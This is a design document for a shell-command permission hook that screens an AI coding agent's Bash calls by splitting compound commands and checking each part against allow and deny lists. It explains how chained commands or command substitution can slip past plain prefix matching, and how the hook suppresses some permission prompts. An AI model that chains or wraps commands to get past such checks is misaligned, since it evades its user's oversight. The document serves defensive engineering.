# bash-safety-hook — architecture and design decisions

> Port of [liberzon/claude-hooks](https://github.com/liberzon/claude-hooks)
> to CommonJS Node, with additions specific to gsd-ng (STRUCTURAL_KEYWORDS,
> per-platform CLI patterns, settings layering). File:
> `hooks/bash-safety-hook.cjs`.

---

## Why this hook exists

Claude Code's built-in `permissions.allow` rules match commands as a whole
string. For compound commands like `git status && curl http://evil.com`,
a prefix match on `git status` auto-approves the whole line — including
the second command. The hook closes that gap by decomposing compound
commands and checking each sub-command against allow/deny patterns
independently.

Secondarily, returning `{"permissionDecision":"allow"}` from the hook
suppresses the tree-sitter-walker prompt described in
[`claude-stability/docs/research/claude-code-internals/tree-sitter-walker-regression.md`](https://github.com/chrisdevchroma/claude-stability/blob/main/docs/research/claude-code-internals/tree-sitter-walker-regression.md)
for any command the hook can fully approve.

## Pipeline inside the hook

```
stdin (Claude Code tool_use JSON)
    │
    ▼
loadMergedSettings()    ─ reads 4 layers: global/global-local/project/project-local
    │
    ▼
decomposeCommand(cmd)   ─ returns a list of normalized sub-commands
    │                     by splitting on &&, ||, ;, |, newlines, $(),
    │                     backticks; stripping heredoc bodies, redirections,
    │                     env-var prefixes; filtering STRUCTURAL_KEYWORDS
    │                     and standalone assignments.
    ▼
decide(subs, settings)  ─ deny-first, then allow-all; passthrough if any
    │                     sub is unmatched.
    ▼
stdout: one of
    {"permissionDecision":"allow",  "permissionDecisionReason":"..."}
    {"permissionDecision":"deny",   "permissionDecisionReason":"..."}
    (silent exit → passthrough to Claude Code's default handling)
```

Design rule: **never block tool execution on hook errors.** JSON parse
failures, stdin timeouts, filesystem errors all exit 0 silently and let
Claude Code fall through to its normal prompting. A broken hook must be
a soft inconvenience, not a hard blocker.

## The four design decisions you most need to know

### 1. STRUCTURAL_KEYWORDS vs allowlist entries

Shell constructs appearing as decomposed sub-commands fall into two groups:

| Group | Handling | Example |
|---|---|---|
| **Nullary and syntax markers** — `done`, `fi`, `then`, `else`, `elif`, `do`, `break`, `continue`, `{`, `}`, `true`, `false` | In `STRUCTURAL_KEYWORDS` → filtered out entirely before allowlist check | `cmd \|\| true` → `true` sub-command skipped; decision depends only on `cmd` |
| **Builtins that may wrap a subshell** — `exit`, `return`, `local`, `export` | In the allowlist as `Bash(<builtin> *)` → decomposer still runs `extractSubshells()` on their args | `local x=$(curl evil.com)` → outer `local` matches `Bash(local *)`, inner `curl` ALSO checked against allowlist |

**Why the split matters.** If `local` were in `STRUCTURAL_KEYWORDS`, the
decomposer's per-part loop would `continue` on the structural match before
reaching the subshell extraction code. The inner `curl evil.com` would
bypass all allowlist checks. Keeping `local`/`export`/`exit`/`return` in
the allowlist lane preserves subshell validation while still auto-approving
the common idioms `cmd || exit 1`, `local x=$(...)`, etc.

**`eval` is deliberately in neither group.** It executes arbitrary strings
at runtime, which no static analysis can verify. `eval` always falls
through to a user prompt.

### 2. Per-platform CLI granularity

`bin/lib/allowlist.cjs` exports `getPlatformCliPatterns(cli)` which
generates granular per-subcommand entries for GitHub (`gh`), GitLab
(`glab`), Forgejo (`fj`), and Gitea (`tea`) CLIs. Example for `gh`:

```
Bash(gh pr *), Bash(gh pr), Bash(gh issue *), Bash(gh issue),
Bash(gh release *), Bash(gh release), Bash(gh workflow *), Bash(gh workflow),
Bash(gh auth *),   Bash(gh auth),   Bash(gh repo *),   Bash(gh repo),
Bash(gh search *), Bash(gh search)
```

Rather than blanket `Bash(gh *)`. This intentionally excludes:

- `gh api` / `glab api` — arbitrary REST calls; users sometimes want
  prompt-per-call for these
- `gh extension` — installs arbitrary code from third-party repos

The installer (`bin/install.js`) detects which CLIs are locally available
and injects patterns for only those CLIs into the seeded `.claude/settings.json`.

### 3. Settings layering

`loadMergedSettings()` merges permissions.allow/deny arrays across up to
four layers:

1. `$CLAUDE_SETTINGS_PATH` or `~/.claude/settings.json` (global)
2. `~/.claude/settings.local.json` (global, gitignored)
3. `$CLAUDE_PROJECT_DIR/.claude/settings.json` (project, committed)
4. `$CLAUDE_PROJECT_DIR/.claude/settings.local.json` (project, gitignored)

Entries are deduplicated and order-preserving. This matches Claude Code's
own layering so users can allowlist tools at whatever scope makes sense
(a team-wide `Bash(foo *)` in project settings; personal additions in
project-local settings).

### 4. Deny-first, allow-all

```
for each sub_command:
    if matches any deny pattern → return deny
for each sub_command:
    if does NOT match any allow pattern → return passthrough
return allow
```

**Passthrough** (silent exit) is different from deny — it lets Claude Code
run its own permission logic, which may still allow the command based on
looser top-level matching, or may prompt the user. The hook never forces
a prompt; it only actively approves or actively denies.

## Template location

One canonical template ships in the source tree:

- `gsd-ng/templates/settings-sandbox.json` — consumed by `bin/install.js`
  for both Claude Code and Copilot runtimes.

## How additions land in an installed workspace

1. Edit the source in `gsd-ng/templates/settings-sandbox.json`.
2. Commit in the submodule boundary.
3. Run `node bin/install.js --local --runtime claude` (or copilot) from
   the consuming workspace.
4. `install.js` computes `template.allow ∪ getPlatformCliPatterns(cli) for
   detected clis` and writes the union to `.claude/settings.json`,
   preserving any user-specific additions that aren't template-managed.

Verify the result with the allowlist-parity diagnostic script:

```sh
node claude-stability/docs/research/claude-code-internals/scripts/verify-allowlist-parity.cjs \
  --local=.claude/settings.json \
  --template=gsd-ng/templates/settings-sandbox.json \
  --allowlist-mod=gsd-ng/bin/lib/allowlist.cjs
```

## Relationship to Claude Code's upstream regression

The tree-sitter walker issue documented in
`claude-stability/docs/research/claude-code-internals/tree-sitter-walker-regression.md`
sometimes fires despite this hook emitting `allow`. When that happens, the
workaround is at the source level — rewrite the triggering syntax in
workflow templates. See the research doc for trigger patterns and
rewrite strategies.

For most cases (`${VAR:-$(...)}`, `$()` command substitution, heredocs,
compound statements) the hook's `allow` suppresses the walker prompt and
no workaround is needed. Validation data at
`claude-stability/.../tree-sitter-walker-regression.md#validation-data`.

## Testing

Unit tests for decomposition, matching, and decision logic live in
`tests/bash-hook.test.cjs` (166 tests across 30 suites as of 2026-04-18).
Integration tests for the install-time allowlist generation live in
`tests/allowlist.test.cjs` (33 tests across 7 suites).

Run both before any changes to the hook or allowlist:

```sh
node --test tests/bash-hook.test.cjs tests/allowlist.test.cjs
```

## Files to know

| File | Purpose |
|---|---|
| `hooks/bash-safety-hook.cjs` | The hook itself (decomposition, matching, decision) |
| `gsd-ng/templates/settings-sandbox.json` | Default allow entries shipped with Claude runtime install |
| `bin/lib/allowlist.cjs` | Per-CLI granular pattern generator |
| `bin/install.js` | Merges template + detected CLI patterns into user settings |
| `tests/bash-hook.test.cjs` | Hook unit tests |
| `tests/allowlist.test.cjs` | Generator tests |
